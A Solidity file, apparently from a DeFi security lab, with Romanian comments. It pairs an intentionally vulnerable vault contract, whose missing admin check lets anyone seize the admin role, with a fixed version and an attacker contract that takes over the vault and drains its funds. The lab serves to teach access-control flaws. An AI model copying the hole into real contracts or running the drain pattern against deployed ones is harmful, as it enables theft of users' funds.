// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AdminVault
 * @notice Contract VULNERABIL pentru Challenge 3 - The DeFi Heist Lab
 * @dev Acest contract conține vulnerabilități de ACCESS CONTROL
 * 
 * ATENȚIE: Acest contract este intenționat vulnerabil pentru scopuri educaționale.
 * NU UTILIZA în producție!
 */
contract AdminVault {
    address public admin;
    address public pendingAdmin;
    
    mapping(address => uint256) public balances;
    uint256 public totalFunds;
    
    bool public paused;
    
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event EmergencyWithdraw(address indexed admin, uint256 amount);
    
    /**
     * @notice Constructor - setează admin-ul inițial
     */
    constructor() {
        admin = msg.sender;
    }
    
    /**
     * @notice Permite utilizatorilor să depună ETH
     */
    function deposit() public payable {
        require(!paused, "Contract is paused");
        require(msg.value > 0, "Must deposit some ETH");
        
        balances[msg.sender] += msg.value;
        totalFunds += msg.value;
        
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Permite retragerea fondurilor proprii
     */
    function withdraw(uint256 _amount) public {
        require(!paused, "Contract is paused");
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        totalFunds -= _amount;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, _amount);
    }
    
    /**
     * @notice Propune un nou administrator
     * 
     * ⚠️ VULNERABILITATE 1: Oricine poate propune un admin nou
     * Ar trebui să fie doar admin-ul curent care poate face asta
     */
    function proposeAdmin(address _newAdmin) public {
        // ❌ LIPSEȘTE: require(msg.sender == admin, "Only admin");
        
        pendingAdmin = _newAdmin;
    }
    
    /**
     * @notice Admin-ul pending acceptă rolul
     * 
     * ⚠️ VULNERABILITATE 2: Combinat cu vulnerabilitatea 1,
     * oricine poate deveni admin în 2 pași
     */
    function acceptAdmin() public {
        require(msg.sender == pendingAdmin, "Only pending admin");
        
        address oldAdmin = admin;
        admin = pendingAdmin;
        pendingAdmin = address(0);
        
        emit AdminChanged(oldAdmin, admin);
    }
    
    /**
     * @notice Admin poate pausa contractul în caz de urgență
     * 
     * ⚠️ VULNERABILITATE 3: Verificarea este corectă, DAR dacă devii admin
     * prin vulnerabilitățile 1+2, poți pausa contractul
     */
    function togglePause() public {
        require(msg.sender == admin, "Only admin");
        paused = !paused;
    }
    
    /**
     * @notice Admin poate retrage toate fondurile în caz de urgență
     * 
     * ⚠️ VULNERABILITATE 4: Combinat cu vulnerabilitățile anterioare,
     * un atacator poate deveni admin și fura toate fondurile
     */
    function emergencyWithdraw() public {
        require(msg.sender == admin, "Only admin");
        
        uint256 amount = address(this).balance;
        totalFunds = 0;
        
        // Reset all balances (simplificat pentru demo)
        
        (bool success, ) = admin.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit EmergencyWithdraw(admin, amount);
    }
    
    /**
     * @notice Verifică dacă o adresă este admin
     */
    function isAdmin(address _address) public view returns (bool) {
        return _address == admin;
    }
    
    /**
     * @notice Returnează balanța contractului
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Returnează balanța unui utilizator
     */
    function getBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }
}


/**
 * @title AdminVaultSecure
 * @notice Versiunea SECURIZATĂ cu Access Control corect
 */
contract AdminVaultSecure {
    address public admin;
    address public pendingAdmin;
    
    mapping(address => uint256) public balances;
    uint256 public totalFunds;
    
    bool public paused;
    
    // Timelock pentru schimbarea admin-ului
    uint256 public adminChangeTimelock = 48 hours;
    uint256 public pendingAdminSetTime;
    
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);
    event AdminProposed(address indexed proposedAdmin, uint256 effectiveTime);
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event EmergencyWithdraw(address indexed admin, uint256 amount);
    
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this");
        _;
    }
    
    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }
    
    constructor() {
        admin = msg.sender;
    }
    
    function deposit() public payable whenNotPaused {
        require(msg.value > 0, "Must deposit some ETH");
        
        balances[msg.sender] += msg.value;
        totalFunds += msg.value;
        
        emit Deposit(msg.sender, msg.value);
    }
    
    function withdraw(uint256 _amount) public whenNotPaused {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        totalFunds -= _amount;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, _amount);
    }
    
    /**
     * @notice ✅ SECURIZAT: Doar admin-ul poate propune un nou admin
     * @dev Include și un timelock pentru securitate adițională
     */
    function proposeAdmin(address _newAdmin) public onlyAdmin {
        require(_newAdmin != address(0), "Invalid address");
        require(_newAdmin != admin, "Already admin");
        
        pendingAdmin = _newAdmin;
        pendingAdminSetTime = block.timestamp;
        
        emit AdminProposed(_newAdmin, block.timestamp + adminChangeTimelock);
    }
    
    /**
     * @notice ✅ SECURIZAT: Include timelock pentru schimbarea admin-ului
     */
    function acceptAdmin() public {
        require(msg.sender == pendingAdmin, "Only pending admin");
        require(
            block.timestamp >= pendingAdminSetTime + adminChangeTimelock,
            "Timelock not expired"
        );
        
        address oldAdmin = admin;
        admin = pendingAdmin;
        pendingAdmin = address(0);
        pendingAdminSetTime = 0;
        
        emit AdminChanged(oldAdmin, admin);
    }
    
    /**
     * @notice ✅ SECURIZAT: Doar admin-ul poate pausa
     */
    function togglePause() public onlyAdmin {
        paused = !paused;
    }
    
    /**
     * @notice ✅ SECURIZAT: Emergency withdraw cu verificare
     */
    function emergencyWithdraw() public onlyAdmin {
        require(paused, "Must pause contract first");
        
        uint256 amount = address(this).balance;
        totalFunds = 0;
        
        (bool success, ) = admin.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit EmergencyWithdraw(admin, amount);
    }
    
    function isAdmin(address _address) public view returns (bool) {
        return _address == admin;
    }
    
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }
    
    /**
     * @notice Permite admin-ului să renunțe la rol (safety feature)
     */
    function renounceAdmin() public onlyAdmin {
        address oldAdmin = admin;
        admin = address(0);
        emit AdminChanged(oldAdmin, address(0));
    }
}


/**
 * @title AdminVaultAttacker
 * @notice Contract pentru a exploata vulnerabilitățile de Access Control
 */
contract AdminVaultAttacker {
    AdminVault public vault;
    address public owner;
    
    event AttackStep(string step, bool success);
    
    constructor(address _vaultAddress) {
        vault = AdminVault(_vaultAddress);
        owner = msg.sender;
    }
    
    /**
     * @notice Execută atacul complet în 3 pași
     */
    function executeAttack() public {
        require(msg.sender == owner, "Only owner");
        
        // Pasul 1: Ne propunem ca admin
        vault.proposeAdmin(address(this));
        emit AttackStep("Proposed as admin", true);
        
        // Pasul 2: Acceptăm rolul de admin
        vault.acceptAdmin();
        emit AttackStep("Accepted admin role", vault.isAdmin(address(this)));
        
        // Pasul 3: Furăm toate fondurile
        vault.emergencyWithdraw();
        emit AttackStep("Drained vault", true);
    }
    
    /**
     * @notice Extragem fondurile furate
     */
    function extractFunds() public {
        require(msg.sender == owner, "Only owner");
        
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @notice Primește ETH
     */
    receive() external payable {}
}
